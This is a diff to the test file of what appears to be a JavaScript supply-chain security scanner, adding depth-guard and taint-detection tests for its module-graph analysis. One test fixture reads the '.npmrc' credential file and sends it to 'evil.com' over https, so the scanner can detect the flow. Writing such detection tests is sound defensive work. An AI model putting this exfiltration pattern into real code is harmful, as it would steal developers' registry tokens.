@@ -2,7 +2,7 @@ const fs = require('fs');
 const path = require('path');
 const os = require('os');
 const { test, assert, assertIncludes, assertNotIncludes, runScan } = require('../test-utils');
-const { buildModuleGraph, annotateTaintedExports, detectCrossFileFlows, annotateSinkExports, detectCallbackCrossFileFlows, detectEventEmitterFlows, MAX_GRAPH_NODES, MAX_GRAPH_EDGES, MAX_FLOWS } = require('../../src/scanner/module-graph');
+const { buildModuleGraph, annotateTaintedExports, detectCrossFileFlows, annotateSinkExports, detectCallbackCrossFileFlows, detectEventEmitterFlows, MAX_GRAPH_NODES, MAX_GRAPH_EDGES, MAX_FLOWS, MAX_TAINT_DEPTH } = require('../../src/scanner/module-graph');
 
 function makeTmpDir() {
   return fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-modgraph-'));
@@ -683,7 +683,7 @@ async function runModuleGraphTests() {
     const tmp = makeTmpDir();
     try {
       // Create files where each imports many others to exceed edge limit
-      const fileCount = 20;
+      const fileCount = 25;
       for (let i = 0; i < fileCount; i++) {
         const imports = [];
         for (let j = 0; j < fileCount; j++) {
@@ -691,7 +691,7 @@ async function runModuleGraphTests() {
         }
         writeFile(tmp, `file${i}.js`, imports.join(';\n') + ';\nmodule.exports = {};');
       }
-      // 20 files × 19 imports each = 380 edges, exceeds MAX_GRAPH_EDGES (200)
+      // 25 files × 24 imports each = 600 edges, exceeds MAX_GRAPH_EDGES (400)
       const graph = buildModuleGraph(tmp);
       const totalEdges = Object.values(graph).reduce((sum, arr) => sum + arr.length, 0);
       assert(totalEdges <= MAX_GRAPH_EDGES + 20,
@@ -1428,6 +1428,64 @@ async function runModuleGraphTests() {
       const sinks = annotateSinkExports(graph, tmp);
       const flows = detectCrossFileFlows(graph, tainted, sinks, tmp);
       assert(flows.length === 0, `Tainted data not passed to sink should produce no flow, got ${flows.length}`);
+    } finally {
+      cleanup(tmp);
+    }
+  });
+
+  // =========================================================================
+  // DEPTH GUARD — DoS protection (v2.6.5)
+  // =========================================================================
+
+  test('module-graph: MAX_TAINT_DEPTH is exported and equals 50', () => {
+    assert(MAX_TAINT_DEPTH === 50, `MAX_TAINT_DEPTH should be 50, got ${MAX_TAINT_DEPTH}`);
+  });
+
+  test('module-graph: deeply nested AST (100 levels) does not crash', () => {
+    const tmp = makeTmpDir();
+    try {
+      // Generate code with deeply nested call expressions: a(b(c(d(...))))
+      let code = 'x';
+      for (let i = 0; i < 100; i++) {
+        code = `f${i}(${code})`;
+      }
+      writeFile(tmp, 'deep.js', `
+        const fs = require('fs');
+        module.exports = ${code};
+      `);
+      // Should not throw or hang — gracefully handles depth
+      const graph = buildModuleGraph(tmp);
+      const tainted = annotateTaintedExports(graph, tmp);
+      assert(typeof tainted === 'object', 'Should return tainted exports object without crashing');
+    } finally {
+      cleanup(tmp);
+    }
+  });
+
+  test('module-graph: normal depth (5 levels) still detects taint correctly', () => {
+    const tmp = makeTmpDir();
+    try {
+      writeFile(tmp, 'index.js', `
+        const reader = require('./reader');
+        const https = require('https');
+        const data = reader.read();
+        https.request({ hostname: 'evil.com' }, () => {}).end(data);
+      `);
+      writeFile(tmp, 'reader.js', `
+        const fs = require('fs');
+        function read() {
+          const inner = function() {
+            return fs.readFileSync('.npmrc', 'utf8');
+          };
+          return inner();
+        }
+        module.exports = { read };
+      `);
+      const graph = buildModuleGraph(tmp);
+      const tainted = annotateTaintedExports(graph, tmp);
+      // reader.js should detect the fs.readFileSync taint through nested function
+      assert(tainted['reader.js'] && Object.keys(tainted['reader.js']).length > 0,
+        'Normal depth (5 levels) should detect taint in reader.js');
     } finally {
       cleanup(tmp);
     }
